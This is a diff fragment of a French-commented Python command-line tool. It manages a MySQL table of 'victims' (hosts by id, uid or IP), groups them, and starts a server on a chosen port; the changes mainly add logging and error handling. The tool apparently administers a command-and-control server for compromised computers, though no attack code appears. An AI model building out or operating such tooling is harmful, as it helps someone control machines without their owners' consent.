-                query = "INSERT INTO victim_groups (group_id, victim_id, created_at, updated_at) VALUES ((SELECT id FROM groups WHERE name = %s), %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-                values = (group_name, victim_id)
+                # Ajout des ordinateurs au groupe
+                for victim_id in victims_list:
+                    query = "INSERT INTO victim_groups (group_id, victim_id, created_at, updated_at) VALUES ((SELECT id FROM groups WHERE name = %s), %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+                    values = (group_name, victim_id)
 
-                mycursor.execute(query, values)
+                    mycursor.execute(query, values)
+                
+                logger.info("ajout des ordinateurs " + args.add_to_group[1] + " au groupe " + args.add_to_group[0])
+                print("ajout des ordinateurs " + args.add_to_group[1] + " au groupe " + args.add_to_group[0])
+            except mysql.connector.ProgrammingError as e:
+                logger.error("Erreur de syntaxe SQL lors de l'ajout des ordinateurs au groupe" + args.add_to_group[0] + " dans la base de données")
+            except mysql.connector.Error as e:
+                logger.error("Erreur lors de l'ajout des ordinateurs au groupe" + args.add_to_group[0] + " dans la base de données")
+        
 
           
 ############################################################
@@ -717,42 +641,52 @@ elif args.add_to_group:
 
 elif args.remove_from_group:
     if args.host or args.group:
+        logger.error("--remove-from-group n'accepte pas les arguments --host et --group")
         parser.error("--remove-from-group n'accepte pas les arguments --host et --group")
 
     else:
-        print("suppression des ordinateurs " + args.remove_from_group[1] + " du groupe " + args.remove_from_group[0])
-
+        
         group_name = args.remove_from_group[0]
 
         # Vérification de l'existence du groupe
         if not group_exists(group_name):
+            logger.error("Le groupe n'existe pas : " + group_name)
             print("Le groupe n'existe pas")
             exit(1)
 
         else:
-            # Récupération des ordinateurs à retirer au groupe
-            victims_list = []
 
-            for victim in args.remove_from_group[1].split(","):
-                query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
-                values = (victim, victim, victim)
+            try:
+                # Récupération des ordinateurs à retirer au groupe
+                victims_list = []
 
-                mycursor.execute(query, values)
-                result = mycursor.fetchall()
+                for victim in args.remove_from_group[1].split(","):
+                    query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+                    values = (victim, victim, victim)
 
-                if len(result) == 0:
-                    print("L'ordinateur '" + victim + "' n'existe pas")
+                    mycursor.execute(query, values)
+                    result = mycursor.fetchall()
 
-                for id in result:
-                    victims_list.append(id[0])
+                    if len(result) == 0:
+                        print("L'ordinateur '" + victim + "' n'existe pas")
+
+                    for id in result:
+                        victims_list.append(id[0])
 
 
-            # Retrait des ordinateurs au groupe
-            for victim_id in victims_list:
-                query = "DELETE FROM victim_groups WHERE victim_id = %s AND group_id = (SELECT id FROM groups WHERE name = %s)"
-                values = (victim_id, group_name)
+                # Retrait des ordinateurs au groupe
+                for victim_id in victims_list:
+                    query = "DELETE FROM victim_groups WHERE victim_id = %s AND group_id = (SELECT id FROM groups WHERE name = %s)"
+                    values = (victim_id, group_name)
 
-                mycursor.execute(query, values)
+                    mycursor.execute(query, values)
+                
+                print("suppression des ordinateurs " + args.remove_from_group[1] + " du groupe " + args.remove_from_group[0])
+                logger.info("suppression des ordinateurs " + args.remove_from_group[1] + " du groupe " + args.remove_from_group[0])
+            except mysql.connector.ProgrammingError as e:
+                logger.error("Erreur de syntaxe SQL lors de la suppression des ordinateurs du groupe" + args.remove_from_group[0] + " dans la base de données")
+            except mysql.connector.Error as e:
+                logger.error("Erreur lors de la suppression des ordinateurs du groupe" + args.remove_from_group[0] + " dans la base de données")
 
 
 ############################################################
@@ -760,37 +694,46 @@ elif args.remove_from_group:
 
 elif args.delete_group:
     if args.host or args.group:
+        logger.error("--delete-group n'accepte pas les arguments --host et --group")
         parser.error("--delete-group n'accepte pas les arguments --host et --group")
 
     else:
-        print("suppression du groupe " + args.delete_group)
-
         group_name = args.delete_group
 
         # Vérification de l'existence du groupe
         if not group_exists(group_name):
+            logger.error("Le groupe n'existe pas : " + group_name)
             print("Le groupe n'existe pas")
             exit(1)
 
         else:
-            # Récupération de l'id du group à supprimer
-            group_id = get_group_id(group_name)
 
-            # Suppression du lien victim/group du groupe à supprimer
-            query = "DELETE FROM victim_groups WHERE group_id = %s"
-            values = (group_id, )
+            try:   
+                # Récupération de l'id du group à supprimer
+                group_id = get_group_id(group_name)
 
-            mycursor.execute(query, values)
+                # Suppression du lien victim/group du groupe à supprimer
+                query = "DELETE FROM victim_groups WHERE group_id = %s"
+                values = (group_id, )
 
-            # Suppression du fichier image si ce n'est pas default.png
+                mycursor.execute(query, values)
 
-            ######## à faire
+                # Suppression du fichier image si ce n'est pas default.png
 
-            # Suppression du groupe
-            query = "DELETE FROM groups WHERE id = %s"
-            values = (group_id, )
+                ######## à faire
 
-            mycursor.execute(query, values)
+                # Suppression du groupe
+                query = "DELETE FROM groups WHERE id = %s"
+                values = (group_id, )
+
+                mycursor.execute(query, values)
+
+                print("suppression du groupe " + group_name)
+                logger.info("suppression du groupe " + group_name)
+            except mysql.connector.ProgrammingError as e:
+                logger.error("Erreur de syntaxe SQL lors de la suppression du groupe dans la base de données")
+            except mysql.connector.Error as e:
+                logger.error("Erreur lors de la suppression du groupe dans la base de données")
 
 
 ############################################################
@@ -798,12 +741,16 @@ elif args.delete_group:
 
 elif args.start:
     if not args.port or args.port < 1023 or args.port > 65535:
+        logger.error("--start nécessite l'argument --port compris entre 1023 et 65535")
         parser.error("--start nécessite l'argument --port compris entre 1023 et 65535")
     else:
-        print("démarrage du serveur sur le port " + str(args.port))
-
-
-        start_server(args.port)
+        try:
+            start_server(args.port, logger)
+            print("démarrage du serveur sur le port " + str(args.port))
+            logger.info("démarrage du serveur sur le port " + str(args.port))
+        except:
+            logger.error("Erreur lors du démarrage du serveur sur le port " + str(args.port))
+            print("Erreur lors du démarrage du serveur sur le port " + str(args.port))
 else :
     parser.error("no action specified. Use -h/--help for help")
 db.commit()
